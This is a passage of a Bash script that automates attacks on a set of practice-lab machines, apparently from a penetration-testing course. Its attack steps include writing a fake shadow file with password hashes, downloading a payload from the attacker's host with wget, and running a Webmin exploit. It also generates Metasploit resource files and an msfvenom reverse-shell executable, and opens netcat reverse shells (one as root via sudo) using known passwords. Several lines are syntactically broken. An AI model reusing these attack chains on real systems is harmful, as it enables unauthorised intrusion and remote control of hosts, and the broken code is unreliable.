        echo -e 'uucp:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'operator:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'games:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'gopher:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'ftp:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'nobody:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'dbus:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'vcsa:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'rpm:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'haldaemon:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'pcap:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'nscd:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'named:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'netdump:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'sshd:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'rpc:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'mailnull:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'smmsp:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'rpcuser:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'nfsnobody:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'apache:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'squid:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'webalizer:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'xfs:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'ntp:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'mysql:!!:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadoww
        echo -e 'bob:$1$g5gebnsY$ioI7NilK5pnXC4vwT7Nqq0:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'alice:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
      fi;
    }
    fc4evilShadow;
    fc4Exploitation() {
      # start the exploitation process
      checkthebrakesTop;
      echo -e "\t[*] Starting Exploitation of FC4 "
      checkthebrakesBot;
      checkthebrakesTop;
      echo -e "\t[*] Starting FC4 NC Listener on port 4321 "
      checkthebrakesBot;
      (makeXtermLog "FC4_NC_Listener" "nc -lvp 4321"
      checkthebrakesTop;
      echo -e "\t[*] Starting FC4 Unauthenticated Shell "
      checkthebrakesBot;
      (makeXtermLog "FC4_Unauthenticate_Shell" "expect -c 'spawn ssh \
          -o StrictHostKeyChecking=no alice@$uip wget http://$AttackerIP/fc4/fc4$toctet.cgi \
          -O /home/alice/fc4$toctet.cgi && \
           chmod 777 /home/alice/fc4$toctet.cgi
           sleep 60
           expect password
           send "alice\n"
           interact' &") >/dev/null
      sleep 60
      checkthebrakesTop;
      echo -e "\t[*] Starting FC4 WebAdmin Exploit (Reverse Shell Attempt 1)"
      checkthebrakesBot;
      (makeXtermLog "FC4_WebAdmin_Shell_Exploit" "perl /usr/share/exploitdb/platforms/multiple/remote/2017.pl \
          $uip 10000 /home/alice/fc4$toctet.cgi 0" &) >/dev/null
      sleep 5
      checkthebrakesTop;
      echo -e "\t[*] Starting FC4 WebAdmin Exploit (Reverse Shell Attempt 2) "
      checkthebrakesBot;
      (makeXtermLog "FC4_Webmin_exploit_rev_shell" "perl /usr/share/exploitdb/platforms/multiple/remote/2017.pl \
          $uip 10000 /home/alice/fc4$toctet.cgi 0' &) >/dev/null
      sleep5
      checkthebrakesTop;
      echo -e "\t[*] Starting FC4 WebAdmin Exploit (Reverse Shell Attempt 3) "
      checkthebrakesBot;
      (makeXtermLog "FC4_Webmin_exploit_rev_shell" "perl /usr/share/exploitdb/platforms/multiple/remote/2017.pl \
          $uip 10000 /home/alice/fc4$toctet.cgi 0' &) >/dev/null
    }
    fc4Exploitation;
    checkthebrakesTop;
    echo -e "\t[*] Finished FC4 Exploitation"
    checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> HELPDESK CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~#
################################################################################
#
# start helpdesk                              
helpdesk() {
  helpdeskRC() {
    if [ ! -f $msfs/helpdesk$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/helpdesk$toctet.rc "
        checkthebrakesBot;
        echo -e "use $helpdeskExploit" >> $msfs/helpdesk$toctet.rc
        echo -e "set rhost $uip" >> $msfs/helpdesk$toctet.rc
        echo -e "set lhost $AttackerIP" >> $msfs/helpdesk$toctet.rc
        echo -e "set lport $lp" >> $msfs/helpdesk$toctet.rc
        echo -e "set payload $pay" >> $msfs/helpdesk$toctet.rc
        echo -e "set $DPH" >> $msfs/helpdesk$toctet.rc
        echo -e "exploit" >> $msfs/helpdesk$toctet.rc
        echo -e "exit" >> $msfs/helpdesk$toctet.rc
    fi;
  }
  helpdeskRC;
  ExploitHelpdesk() {
    checkthebrakesTop;
    echo -e "\t[*] Starting HelpDesk Exploitation "
    checkthebrakesBot;
    # Then how did he email the helpdesk
    (makeXtermLog "HelpDesk_Exploitation" "$msfc -r $msfs/helpdesk$toctet.rc" &0 >/dev/null
    sleep 190s
    ps -A xf |\
      grep -v grep |\
      grep helpdesk |\
      grep xterm |\
      cut -d" " -f1 |\
      xargs kill -9
  }
  ExploitHelpdesk;
  checkthebrakesTop;
  echo -e "\t[*] Finished HelpDesk Exploitation "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~~> CORY CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start cory
cory() {
  coryprep() {
    if [ ! -d $webdir/cory ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/cory "
        checkthebrakesBot;
        mkdir $webdir/cory
    fi;
  }
  coryprep;
  coryevil() {
    if [ ! -f $webdir/cory/evil$toctet.exe ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/cory/evil$toctet.exe "
        checkthebrakesBot;
        $msfv -p $pay LHOST=$AttackerIP LPORT=$lp X > $webdir/cory/evil$toctet.exe
    fi;
  }
  coryevil;
  coryExploitation() {
    # start exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Information about Cory is provided below "
    checkthebrakesBot;
    checkthebrakesTop;
    echo -e 'Default pass:\tPASSWORD'
    echo -e 'You need to direct Cory through IE to your evil web server and download a file'
    echo -e 'Run the local priv. exploit to get System/NT_Atuh on this machine.'
    echo -e 'The address to this file is: http://$AttackerIP/cory/evil$toctet.exe'
    sleep 500' 
    checkthebrakesBot;
    checkthebrakesTop;
    echo -e "\t[*] Starting Cory Remote Desktop Attempt"
    checkthebrakesBot;
    (makeXtermLog "Cory_Remote_Desktop_Connection" "rdesktop -s cmd.exe -u cory -p PASSWORD -A $uip" &) >/dev/null
  }
  coryExploitation;
  checkthebrakesTop;
  echo -e "\t[*] Finished Cory Information"
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~> DEBIAN CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start Debian
debian() {
  makeDebianRC() {
    # start debian resource file structure
    if [ ! -f $msfs/debian$toctet.rc ];
      then 
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/debian$toctet.rc "
        checkthebrakesBot;
        echo -e "use $debianExploit" > $msfs/debian$toctet.rc
        echo -e "set RHOST $uip" >> $msfs/debian$toctet.rc
        echo -e "set target 2" >> $msfs/debian$toctet.rc
        echo -e "set $DPH" >> $msfs/debian$toctet.rc
        echo -e "setRPORT $lp" >> $msfs/debian$toctet.rc
        echo -e "exploit" >> $msfs/debian$toctet.rc
        echo -e "exit" >> $msfs/debian$toctet.rc
    fi;
  }
  makeDebianRC;
  ExploitDebian() {
    # start debian exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Exploitation of Debian "
    checkthebrakesBot;
    (makeXtermLog "Debian_Exploitation" "$msfc -r $msfs/debian$toctet.rc" &) >/dev/null
  }
  ExploitDebian;
checkthebrakesTop;
echo -e "\t[*] Finished Exploitation of Debian "
checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~> SEAN CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
################################################################################
#
# start Sean
Sean() {
  checkthebrakesTop;
  echo -e "\t[*] Starting Exploitation of Sean "
  checkthebrakesBot;
  echo -e "\t[*] Starting Sean NC Listener "
  checkthebrakesBot;
  (makeXtermLog "Seans_NC_Listener" "nc -l -v -p 4576 &" &) >/dev/null
  checkthebrakesBot;
  echo -e "\t[*] Establishing Shell (Sean User) for continued access"
  checkthebrakesBot;
  (makeXtermLog "Sean_SSH_Connection" "expect -c 'eval spawn ssh -o StrictHostKeyChecking=no sean@$uip \"nc -vvn $AttackerIP 4576 -e /bin/sh\";
     expect assword;
     send \"PASSWORD\r\";
     interact'"&) >/dev/null
  checkthebrakesBot;
  echo -e "\t[*] Starting Sean (root user) NC Listener "
  checkthebrakesBot;
  (makeXtermLog "Seans_NC_Listener" "nc -l -v -p 4577 &" &) >/dev/null
  checkthebrakesBot;
  echo -e "\t[*] Establishing Shell (root User) for continued access"
  checkthebrakesBot;
  (makeXtermLog "Sean_Root_Shell" "expect -c 'eval spawn ssh -o StrictHostKeyChecking=no sean@$uip \"sudo nc -vvn $AttackerIP 4577 -e /bin/sh &\";
     sleep 10;
     expect assword;
     send \"PASSWORD\r\";
     interact'" &) >/dev/null
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of Sean "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~~~~~~~> POP-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
################################################################################
#
# start POP-A-BOX
# Checking id used spawned terminals and killing them as needed!
POPABOX() {
  if [ $loctet == "201" ];
    then
      #Choose Alice
      alicedescription() {
        checkthebrakesTop;
        echo -e "\t[*] Alice Exploitation is described as follows: "
        echo -e "\t[-] Description:" 
        echo -e "\t      Alice has an unpatched vulnerability on her machine"
        echo -e "\t      This vulnerability has PoC code located in metasploit"
        echo -e "\t      Attacking the exposed SMB port, LSASS can be overflown"
        echo -e "\t[!] Use Metasploit:"
        echo -e "\t      use exploit/windows/smb/ms04_011_lsass "
        echo -e "\t[!] This exploit will give System/NT_Auth access to the host "
        checkthebrakesBot;
      }
      (alicedescription);
      (AliceInWonderland)
    elif [ $loctet == "202" ];
      then
        # Choose GHOST
        (GhostAttack)
        checkthebrakesTop;
        echo -e "\t[*] Ghost Exploitation is multi-phased as described below: "
        echo -e "\t\t[-] Description:"
        echo -e "\t\t[-] Stage(1): "
        echo -e "\t\t[-] Stage(2): "
        echo -e "\t\t[-] Stage(3): "
        checkthebrakesBot;
    elif [ $loctet == "203" ]; 
      then
        # Choose BOB 1
        (killBoB)
    elif [ $loctet == "204" ]; 
      then
        # Choose BOB 2
        (killBoB)
    elif [ $loctet == "205" ]; 
      then
        # Choose ORACLE 1
        (talkTotheOracle1)
    elif [ $loctet == "206" ]; 
      then
        # Choose ORACLE 2
        (talkTotheOracle2)
    elif [ $loctet == "207" ]; 
      then
        # Choose ORACLE 2
        (PedroSanchez)
    elif [ $loctet == "208" ];
      then
        # Choose Phoenix
        (RiseofthePhoenix)
    elif [ $loctet == "209" ];
      then
        # Choose Cacti
        (CactiSpine)
    elif [ $loctet == "211" ];
      then
        # Choose Trix
        (SillyRabbit)
    elif [ $loctet == "213" ];
      then
        # Choose MSFPRO 1 
        (MSFPRO)
    elif [ $loctet == "214" ];
      then
        # Choose MSFPRO 2
        (MSFPRO)
    elif [ $loctet == "215" ];
      then
        # Choose RedHat
        (RedHatHaXoR)
    elif [ $loctet == "217" ];
      then
        # Choose RedHat9
        (RedHatHaXin9)
    elif [ $loctet == "220" ];
      then
        # Choose Master
        (MasterAttack)
    elif [ $loctet == "221" ];
      then
        # Choose Slave
        (SexSlave)
    elif [ $loctet == "222" ];
      then
        # Choose MailMan
        (MailMan)
    elif [ $loctet == "223" ];
      then
        # Choose Jeff
        (djJazzy)
    elif [ $loctet == "224" ];
      then
        # Choose CSCart
        (cscartfsk)
    elif [ $loctet == "226" ];
      then
        # Choose IT Joe
        (ITJoe)
    elif [ $loctet == "227" ];
      then
        # Choose WebSQL
        (WebSQL)
    elif [ $loctet == "229" ];
      then
        # Choose ThinMail
        (ThinMail)
    elif [ $loctet == "231" ];
      then
        # Choose Ralph
        (Ralph)
    elif [ $loctet == "234" ];
      then
        # Choose Gentoo
        (Gentoo)
    elif [ $loctet == "235" ];
      then
        # Choose Pain
        (Pain)
    elif [ $loctet == "236" ];
      then
        # Choose Suffer
        (sufferMore)
    elif [ $loctet == "241" ];
      then
        # Choose FC4ME
        (fc4me)
    elif [ $loctet == "242" ];
      then
        # Choose FC4ME
        (fc4me)
    elif [ $loctet == "245" ];
      then
        # Choose HelpDesk
        (helpdesk)
    elif [ $loctet == "247" ];
      then
        # Choose Cory
        (cory)
    elif [ $loctet == "249" ];
      then
        # Choose Debian
        (debian)
    elif [ $loctet == "251" ];
      then
        # Choose Sean
        (Sean)
  fi;
}
#if [ `echo $uip | cut -d"." -f4` == "203" ]; then
# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
# read death
# if [ $rev == "Y" && $rev == "y" ];then
#  ps -A xf | grep bobmh.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
# else
#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
# fi
#fi

#if [ `echo $uip | cut -d"." -f4` == "204" ]; then
# echo -e "\n\n[*] Do you wish to kill the spawned terminals for this hack on "$uip
# read death
# if [ $rev == "Y" ];then
#  ps -A xf | grep bobmh2.rc | grep "ruby" | cut -d " " -f1 | xargs kill -9
# else
#  echo -e "\n\n[*] Leaving spawned terminals open for "$uip 
# fi
#fi
#
################################################################################
#~~~~~~~~~~~~~~~~~~~~~> REV-A-BOX & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~~#
################################################################################
#
# start REV-A-BOX
doarevwget() {
  if [ $toctet == "11" ];
    then
      vmlocation="vm10";
      revip="10.10.10.7"
    elif [ $toctet == "13" ];
      then
        vmlocation="vm12";
        revip="10.10.11.7"
    elif [ $toctet == "15" ];
      then
        vmlocation="vm21";
        revip="10.10.14.7"
  fi;
  wg="wget ";
  nocheck="--no-check-certificate ";
  post="--post-data=\"";
  action="awlAction=login&";
  username="awlUserName=OSIDNUM&";
  passwd="awlPasswd=PASSWORD&";
  ipaddr="ip=$revuip&";
  type="type=servers&";
  ipaddr="ip=$revuip&";
  strike="strike=0&";
  location="location=$vmlocation\" ";
  serverurl="https://$revip/functions/revert_machine_admin.php";
  revcmd="$wg$nocheck$post$action$username$passwd$ipaddr$type$ipaddr$strike$location$serverurl"
  cleanup() {
    rm ./revert_machine_admin.php* 2>/dev/null;
  }
  (`$revcmd`);
  (cleanup);
}
# reverting panel
REVABOC() {
  takerevin() {
    if [ $select == "revert" ];
      then
        #echo -e "\n\n[*] Do you wish to revert the machine "$uip
        #echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
        checkthebrakesTop;
        echo -e "\n\n[*] Please enter an IP address of the machine you wish to revert\n\t"
        checkthebrakesBot;
        read revuip
    fi;
  }
  takerevin;
  doublecheckrev() {
    checkthebrakesTop'
    echo -e "\n\n\t[*] Do you wish to revert the machine "$uip
    echo -e "\n\t\t[*] Please enter (Y) for Yes or (ANYTHING) else for No\n"
    read doublerev
    checkthebrakesBot;
  }
  doublecheckrev;
    if [ $doublerev == "Y" ];
      then
        doarevwget;
      else
        takerevin;
    fi;
  }
  doublecheckrev()
  # end revert
}
#
################################################################################
#~~~~~~~~~~~~~~~~~~~> GAME OF LABS & EXPLOITATION SECTION <~~~~~~~~~~~~~~~~~~~~#
################################################################################
#
# start POP-A-BOX
# Checking id used spawned terminals and killing them as needed!
GameOfLABS() {
  # Read userinput from STDIN
  # Take IP as variable
  # Use against a list of known targets....
  # Kick off functions as needed per host
  checkthebrakesTop;
  echo -e "[*] Thank you for playing the Game of LABS, "
  echo -e "\t[?] What do you want to do? - Answers are: 'pop XOR revert' choose wisely\n"
  takeIP() {
    read selection;
    if [ "$selection" == "pop" ];
      then
        echo -e "\n[*] Please enter an IP address to Exploit ...\n"
        read uip
        echo;
        checkthebrakesNo;
        chopandskew() {
          loctet=`echo $uip | cut -d"." -f4`;
          toctet=`echo $uip | cut -d"." -f3`;
        }
        chopandskew;
    fi;
  }
  takeIP;
  makeuservar() {
    # AttackerIP Configuration
    if [ "$toctet" == "11" ];
      then
        AttackerIP=$lh1
      elif [ "$toctet" == "13" ];
        then
          AttackerIP=$lh2
      elif [ "$toctet" == "15" ];
        then
          AttackerIP=$lh3
    fi;
  }
  (takeIP);
  (makeuservar);
  (POPABOX);
}
(GameOfLABS);
